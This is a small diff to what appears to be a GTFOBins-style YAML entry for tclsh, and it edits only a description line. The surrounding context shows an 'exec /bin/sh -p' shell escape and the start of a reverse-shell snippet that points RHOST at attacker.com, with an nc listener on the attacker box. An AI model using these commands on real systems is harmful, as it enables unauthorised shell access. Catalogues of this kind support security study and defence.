@@ -13,7 +13,7 @@ functions:
         ./tclsh
         exec /bin/sh -p <@stdin >@stdout 2>@stderr
   reverse-shell-non-interactive:
-    - description: Run `nc -l -p 12345` to receive the shell on the other end.
+    - description: Run `nc -l -p 12345` on the attacker box to receive the shell.
       code: | 
         export RHOST=attacker.com
         export RPORT=12345 
